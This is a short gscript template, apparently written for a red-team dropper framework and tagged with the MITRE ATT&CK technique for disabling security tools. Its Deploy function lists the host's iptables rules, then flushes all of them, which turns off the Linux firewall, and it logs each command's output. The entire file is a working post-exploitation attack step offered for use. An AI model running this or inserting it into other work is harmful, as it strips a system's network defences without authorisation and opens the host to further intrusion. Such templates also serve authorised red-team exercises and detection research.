// Example gscript template
// Title: Disable Linux Firewall
// Author: ahhh
// Purpose: Drops the linux firewall by dropping all of the iptables rules
// Tactic: low pirority to earlier
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1089

//priority:90
//timeout:150

function Deploy() {  
    console.log("Starting Disable Linux Firewall");

    var response = G.exec.ExecuteCommand("iptables", ["-L"]);
    console.log("Pid: "+response[0]);
    console.log("stdout: "+response[1]);
    console.log("stderr: "+response[2]);
    console.log("exit code: "+response[3]);
    console.log("go errors: "+Dump(response[4]));
  
    var response2 = G.exec.ExecuteCommand("iptables", ["--flush"]);
    console.log("Pid: "+response2[0]);
    console.log("stdout: "+response2[1]);
    console.log("stderr: "+response2[2]);
    console.log("exit code: "+response2[3]);
    console.log("go errors: "+Dump(response2[4]));

    console.log("Done Disable Linux Firewall");
    return true;
}
  